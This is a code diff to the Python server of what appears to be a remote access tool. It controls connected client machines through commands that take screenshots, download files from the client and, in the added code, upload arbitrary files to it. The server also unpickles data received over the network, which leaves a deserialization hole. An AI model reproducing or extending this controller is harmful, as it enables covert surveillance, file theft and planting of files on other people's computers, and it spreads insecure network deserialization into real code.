@@ -7,9 +7,10 @@ __version__ = '2.0'
 from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, gaierror
 from threading import Thread
 from getpass import getuser
-from pickle import loads
+from pickle import loads, dumps
 from datetime import datetime
 from pathlib import Path
+from time import sleep
 from rich.progress import BarColumn, Progress, TimeRemainingColumn
 from rich import print as printr
 from os import system, uname
@@ -27,12 +28,12 @@ class Server(object):
 
     def attach(self, name):
         if name:
-            if self.connectedUsers.get(name[0]):
-                self.userAttached = name[0]
+            if self.connectedUsers.get(name):
+                self.userAttached = name
                 self.userCwd = self.connectedUsers.get(self.userAttached)['currentDirectory']
-                printr(f'[green] You are attached to a section with {name[0]} now!')
+                printr(f'[green] You are attached to a section with {name} now!')
             else:
-                printr(f'[red] There is no open session with [yellow]{name[0]}.')
+                printr(f'[red] There is no open session with [yellow]{name}.')
         else:
             printr('Info: Attaches to an active session. [green]Ex: /attach zNairy-PC')
 
@@ -46,6 +47,13 @@ class Server(object):
         for folder in ['./screenshots','files']:
             if not Path(folder).is_dir():
                 Path(folder).mkdir()
+
+    def sendHeader(self, connection, header):
+        connection.send(dumps(header))
+
+    def splitFile(self, path):
+        with open(path, 'rb') as file:
+            return Path(path).stem, Path(path).suffix, file.read()
 
     def saveReceivedFile(self, path, content):
         with open(path, 'wb') as receivedFile:
@@ -65,6 +73,34 @@ class Server(object):
                 progress.update(task, advance=len(received))
 
         self.saveReceivedFile(f'./{header["path"]}/{header["namefile"]}{header["extension"]}', file)
+    
+    def upload(self, args):
+        if self.userAttached:
+            if args:
+                try:
+                    if Path(args).is_file():
+                        connection = self.connectedUsers[self.userAttached]['conn']
+                        connection.send(self.lastCommand.encode())
+                        
+                        namefile, extension, file = self.splitFile(args)
+                        self.sendHeader(connection, {"namefile": namefile, "extension": extension, "bytes": len(file)})    
+                        sleep(1)
+                        connection.send(file)
+
+                        response = loads(connection.recv(512))
+                        if response['sucess']:
+                            printr(f"[green]{response['content']}")
+                        else:
+                            printr(f"[red]{response['content']}")
+                    else:
+                        printr(f'[red] File {args} not found.')
+
+                except Exception as err:
+                    printr(f'[red] {err}')
+            else:
+                printr('Info: Upload a file to client. [green]Ex: /upload nothing.pdf')
+        else:
+            printr('[yellow] No session currently attached.')
 
     def download(self, args):
         self.checkFolders()
@@ -74,10 +110,10 @@ class Server(object):
                 connection = self.connectedUsers[self.userAttached]['conn']
                 connection.send(self.lastCommand.encode())
                 header = loads(connection.recv(512))
-                if header["exists"]:
+                if header["sucess"]:
                     self.receiveFile(connection, header)
                 else:
-                    printr('[red] File not found.')
+                    printr(f'[red]{header["content"]}')
             else:
                 printr('Info: Download an external file. [green]Ex: /download sóastop.mp3')
         else:
@@ -102,13 +138,13 @@ class Server(object):
 
     def removeUser(self, name):
         if name:
-            if self.connectedUsers.get(name[0]):
+            if self.connectedUsers.get(name):
                 if self.userAttached:
                     self.detach(self.userAttached)
-                self.connectedUsers.pop(name[0])
-                printr(f'[green] Session with [yellow]{name[0]} [green]removed!')
+                self.connectedUsers.pop(name)
+                printr(f'[green] Session with [yellow]{name} [green]removed!')
             else:
-                printr(f'[red] There is no open session with [yellow]{name[0]}.')
+                printr(f'[red] There is no open session with [yellow]{name}.')
         else:
             print('Info: Removes an active section. [green]Ex: /rmsession zNairy-PC')
 
@@ -150,6 +186,7 @@ class Server(object):
             "/rmsession": {"local": True, "action": self.removeUser},
             "/screenshot": {"local": False, "action": self.screenshot},
             "/download": {"local": False, "action": self.download},
+            "/upload": {"local": False, "action": self.upload},
             "/author": {"local": True, "action": self.showCodeAuthor},
             "/contact": {"local": True, "action": self.showContact},
             "/version": {"local": True, "action": self.showVersion},
@@ -161,17 +198,17 @@ class Server(object):
         return commands
 
     def splitCommand(self, command):
-        if self.allCommands().get(command[0]):
-            return self.allCommands()[command[0]], command[1:]
+        if self.allCommands().get(command.split()[0]):
+            return self.allCommands()[command.split()[0]], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #
 
-        return False, command[1:]
+        return False, ''.join(f'{cmd} ' for cmd in command.split()[1:])
 
     def checkCommand(self, command):
         self.lastCommand = command
 
-        command, args = self.splitCommand(command.split())
+        command, args = self.splitCommand(command)
         if command:
-            command['action'](args)
+            command['action'](args.strip())
         else:
             printr('[red] Command does not exist.')
 
